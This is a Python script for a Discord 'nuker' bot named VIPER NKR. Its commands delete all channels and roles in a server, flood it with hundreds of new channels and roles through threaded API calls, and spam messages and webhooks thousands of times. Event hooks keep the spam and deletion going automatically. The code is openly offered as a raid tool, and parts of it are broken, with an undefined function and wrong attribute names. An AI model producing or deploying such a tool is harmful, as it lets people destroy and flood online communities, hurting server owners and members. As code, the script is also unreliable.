import sys, discord, requests, json, threading, random, asyncio,aiohttp
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

token = input("Bot Token: ")
prefix = input("Prefix: ")
stats = input("Status: ")
chan = input("Channel Name: ")
spamdata = input("Spam content: ")
rol = input("Spam Roles: ")
webname = input("Spam Webhook names: ")
amountss = 1000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents,proxy="http://localhost:7890")
bot.remove_command("help")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }



@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("""$$\    $$\ $$$$$$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\        $$\   $$\ $$\   $$\ $$$$$$$\  
$$ |   $$ |\_$$  _|$$  __$$\ $$  _____|$$  __$$\       $$$\  $$ |$$ | $$  |$$  __$$\ 
$$ |   $$ |  $$ |  $$ |  $$ |$$ |      $$ |  $$ |      $$$$\ $$ |$$ |$$  / $$ |  $$ |
\$$\  $$  |  $$ |  $$$$$$$  |$$$$$\    $$$$$$$  |      $$ $$\$$ |$$$$$  /  $$$$$$$  |
 \$$\$$  /   $$ |  $$  ____/ $$  __|   $$  __$$<       $$ \$$$$ |$$  $$<   $$  __$$< 
  \$$$  /    $$ |  $$ |      $$ |      $$ |  $$ |      $$ |\$$$ |$$ |\$$\  $$ |  $$ |
   \$  /   $$$$$$\ $$ |      $$$$$$$$\ $$ |  $$ |      $$ | \$$ |$$ | \$$\ $$ |  $$ |
    \_/    \______|\__|      \________|\__|  \__|      \__|  \__|\__|  \__|\__|  \__|
                                                                                     
                                                                                     
                                                                                     """)
    print(Fore.GREEN+"Commands - nuke,scc,sdc,sdr,scr,spam,swh")
    print(Fore.GREEN+f"Logged in as {bot.user.name}")
    print(Fore.GREEN+f"Prefix - {prefix}")

def logo():
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")

@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()

@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json,
           
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()

@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.role):
        await role.delete()

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json,
          
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=dc,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()

@bot.command()
async def sdc(ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)

@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)

@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            return



@bot.event
async def on_guild_channel_delete(channel,ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()

@bot.event
async def on_guild_role_delete(role,ctx):
    for role in list(ctx.guild.role):
        await role.delete()
    



bot.run(token)
